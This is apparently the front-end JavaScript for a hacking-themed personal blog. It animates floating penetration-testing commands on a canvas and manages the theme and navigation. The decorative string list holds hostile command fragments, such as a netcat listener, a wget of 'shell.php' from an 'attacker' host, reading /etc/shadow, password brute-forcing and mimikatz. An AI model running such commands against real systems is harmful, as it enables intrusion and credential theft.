/* =========================================================
   static-pages.js  —  pasta-cod3.github.io
   Usato da: about.html, contatti.html (pagine statiche)
   Funzioni: canvas animato, tema, hamburger menu
   ========================================================= */

'use strict';

/* ─── CANVAS: frammenti di codice fluttuanti ─────────────── */

const CODE_FRAGMENTS = [
  'nmap -sV -sC -p-',       'dirb http://target/',
  'sqlmap -u "url" --dbs',  'hydra -l admin -P rockyou.txt',
  'gobuster dir -u url',    'msfconsole -q',
  'nc -lvnp 4444',          'python3 -c "import pty;pty.spawn(\'/bin/bash\')"',
  'cat /etc/shadow',        'sudo -l',
  'find / -perm -4000',     'linpeas.sh',
  'chisel server -p 8080',  'proxychains nmap',
  'john --wordlist=rockyou','hashcat -m 0 hash.txt',
  'curl -s http://target',  'wget http://attacker/shell.php',
  'ssh -L 1080:127.0.0.1', 'ssh -D 1080 user@host',
  'tcpdump -i eth0',        'wireshark &',
  'burpsuite &',            './exploit.py',
  'whoami && id',           'uname -a',
  'ps aux | grep root',     'netstat -tulnp',
  'ip route show',          'arp -a',
  'enum4linux -a target',   'rpcclient -U "" target',
  'smbclient -L target',    'crackmapexec smb target',
  'evil-winrm -i target',   'impacket-psexec',
  'mimikatz # sekurlsa',    'bloodhound-python -d',
  'certutil -decode',       'msfvenom -p windows',
  'base64 -d shell.b64',    'xxd -r -p hex.txt',
  'strings binary | grep',  'ltrace ./vuln',
  'gdb -q ./binary',        'pwndbg> cyclic 200',
  'checksec --file=elf',    'ROPgadget --binary elf'
];

class CodeFrag {
  constructor(canvas) {
    this.canvas = canvas;
    this.reset(true);
  }

  reset(init = false) {
    const c = this.canvas;
    this.text    = CODE_FRAGMENTS[Math.floor(Math.random() * CODE_FRAGMENTS.length)];
    this.x       = Math.random() * c.width;
    this.y       = Math.random() * c.height;
    this.fontSize= 9 + Math.random() * 3.5;
    this.bright  = Math.random() < 0.18;
    this.maxAlpha= this.bright ? 0.35 : 0.14;
    this.color   = this.bright ? '#00c8ff' : '#004466';
    this.state   = init
      ? (['typing','hold','fade'])[Math.floor(Math.random() * 3)]
      : 'typing';
    this.charIdx = this.state === 'typing'
      ? Math.floor(Math.random() * this.text.length)
      : (this.state === 'hold' ? this.text.length : this.text.length);
    this.alpha   = this.state === 'typing' ? 0
      : (this.state === 'hold' ? this.maxAlpha : this.maxAlpha * Math.random());
    this.holdTick= 0;
    this.holdMax = 40 + Math.random() * 80;
    const isMob  = window.innerWidth < 768;
    this.typeRate= isMob ? 3 : 2 + Math.floor(Math.random() * 4);
    this.tick    = 0;
  }

  update() {
    this.tick++;
    if (this.state === 'typing') {
      this.alpha = Math.min(this.maxAlpha, this.alpha + 0.015);
      if (this.tick % this.typeRate === 0) {
        this.charIdx++;
        if (this.charIdx >= this.text.length) this.state = 'hold';
      }
    } else if (this.state === 'hold') {
      this.holdTick++;
      if (this.holdTick >= this.holdMax) this.state = 'fade';
    } else {
      this.alpha -= 0.012;
      if (this.alpha <= 0) this.reset();
    }
  }

  draw(ctx) {
    if (this.alpha <= 0) return;
    ctx.save();
    ctx.font         = `${this.fontSize}px 'JetBrains Mono', monospace`;
    ctx.fillStyle    = this.color;
    ctx.globalAlpha  = this.alpha;
    ctx.letterSpacing= '0.04em';
    const visible = this.text.slice(0, this.charIdx);
    const cursor  = this.state === 'typing'
      ? (Math.floor(Date.now() / 530) % 2 === 0 ? '▋' : '') : '';
    ctx.fillText(visible + cursor, this.x, this.y);
    ctx.restore();
  }
}

function initCanvas() {
  const canvas = document.getElementById('spaceCanvas');
  if (!canvas) return;

  const mq = window.matchMedia('(prefers-reduced-motion: reduce)');
  if (mq.matches) { canvas.style.display = 'none'; return; }

  const ctx = canvas.getContext('2d');
  let frags = [], raf;

  function resize() {
    canvas.width  = window.innerWidth;
    canvas.height = window.innerHeight;
  }

  function spawn() {
    const isMob = window.innerWidth < 768;
    const count = isMob ? 6 : 16;
    frags = Array.from({ length: count }, () => new CodeFrag(canvas));
  }

  function loop() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    frags.forEach(f => { f.update(); f.draw(ctx); });
    raf = requestAnimationFrame(loop);
  }

  let resizeTimer;
  window.addEventListener('resize', () => {
    clearTimeout(resizeTimer);
    resizeTimer = setTimeout(() => {
      cancelAnimationFrame(raf);
      resize();
      spawn();
      loop();
    }, 200);
  });

  resize();
  spawn();
  loop();
}

/* ─── TEMA chiaro / scuro ────────────────────────────────── */

function initTheme() {
  const btn = document.getElementById('themeToggle');
  if (!btn) return;

  const saved = localStorage.getItem('theme');
  if (saved === 'light') document.documentElement.classList.add('light');

  function updateBtn() {
    const isLight = document.documentElement.classList.contains('light');
    btn.textContent = isLight ? '◑ DARK' : '◐ LIGHT';
    btn.setAttribute('aria-label', isLight ? 'Passa al tema scuro' : 'Passa al tema chiaro');
  }

  updateBtn();

  btn.addEventListener('click', () => {
    document.documentElement.classList.toggle('light');
    const isLight = document.documentElement.classList.contains('light');
    localStorage.setItem('theme', isLight ? 'light' : 'dark');
    updateBtn();
  });
}

/* ─── HAMBURGER / NAV DRAWER ─────────────────────────────── */

function initNav() {
  const hamburger = document.getElementById('hamburger');
  const overlay   = document.getElementById('navOverlay');
  const drawer    = document.getElementById('navDrawer');
  if (!hamburger || !overlay || !drawer) return;

  function openDrawer() {
    drawer.classList.add('open');
    overlay.classList.add('visible');
    document.body.style.overflow = 'hidden';
    hamburger.setAttribute('aria-expanded', 'true');
  }

  function closeDrawer() {
    drawer.classList.remove('open');
    overlay.classList.remove('visible');
    document.body.style.overflow = '';
    hamburger.setAttribute('aria-expanded', 'false');
  }

  hamburger.addEventListener('click', () => {
    drawer.classList.contains('open') ? closeDrawer() : openDrawer();
  });

  overlay.addEventListener('click', closeDrawer);

  // Chiudi con ESC
  document.addEventListener('keydown', e => {
    if (e.key === 'Escape') closeDrawer();
  });

  // Link nel drawer che portano a categoria su index.html
  drawer.querySelectorAll('[data-cat]').forEach(link => {
    link.addEventListener('click', e => {
      const cat = link.dataset.cat;
      if (cat) {
        e.preventDefault();
        sessionStorage.setItem('filterCat', cat);
        window.location.href = link.getAttribute('href') || 'index.html';
      }
    });
  });
}

/* ─── SEARCH TOGGLE (mobile) ─────────────────────────────── */

function initSearchToggle() {
  const btn = document.getElementById('searchToggleBtn');
  const bar = document.getElementById('searchMobileBar');
  const inp = document.getElementById('searchInputMobile');
  if (!btn || !bar) return;

  btn.addEventListener('click', () => {
    const open = bar.classList.toggle('open');
    if (open && inp) inp.focus();
  });
}

/* ─── KEYBOARD SHORTCUT ⌘K / Ctrl+K ─────────────────────── */

function initSearchShortcut() {
  document.addEventListener('keydown', e => {
    if ((e.metaKey || e.ctrlKey) && e.key === 'k') {
      e.preventDefault();
      // Su pagine statiche porta a index con focus search
      sessionStorage.setItem('focusSearch', '1');
      window.location.href = 'index.html';
    }
  });
}

/* ─── TERMINAL ANIMATION (about.html) ───────────────────── */
/* L'animazione principale è inline in about.html per garantire
   l'ordine di esecuzione. Questo blocco aggiunge solo eventuale
   logica extra se #terminalBox esiste. */

function initTerminalExtras() {
  const box = document.getElementById('terminalBox');
  if (!box) return;
  // Cursore lampeggiante permanente sull'ultima linea
  // (già gestito dal CSS con @keyframes blink sull'elemento .cursor)
}

/* ─── INIT ───────────────────────────────────────────────── */

document.addEventListener('DOMContentLoaded', () => {
  // Flash-prevention già eseguito inline nell'<head>
  initCanvas();
  initTheme();
  initNav();
  initSearchToggle();
  initSearchShortcut();
  initTerminalExtras();
});
